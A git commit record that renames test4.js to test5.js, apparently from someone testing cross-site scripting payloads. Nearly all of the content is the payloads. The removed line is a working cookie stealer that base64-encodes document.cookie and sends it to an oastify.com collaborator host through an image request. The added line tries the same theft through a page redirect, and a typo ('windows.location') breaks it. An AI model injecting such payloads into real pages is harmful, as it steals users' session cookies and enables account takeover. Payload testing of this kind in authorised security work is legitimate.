ad2da486ba014fc5072e36e8a65b9529486326a7
anded <82957468+anded@users.noreply.github.com>
2025-05-02 07:55:15 -0400

    Update and rename test4.js to test5.js

--- test4.js
+++
@@ -1,1 +0,0 @@
-x = new Image(); x.src = "https://vhg8d4hxw4y7vjsaenfl2k8wknqee62v.oastify.com/bla?data=" + btoa(document.cookie);
---
+++ test5.js
@@ -0,0 +1,1 @@
+windows.location.href = "https://vhg8d4hxw4y7vjsaenfl2k8wknqee62v.oastify.com/bla?data=" + btoa(document.cookie);
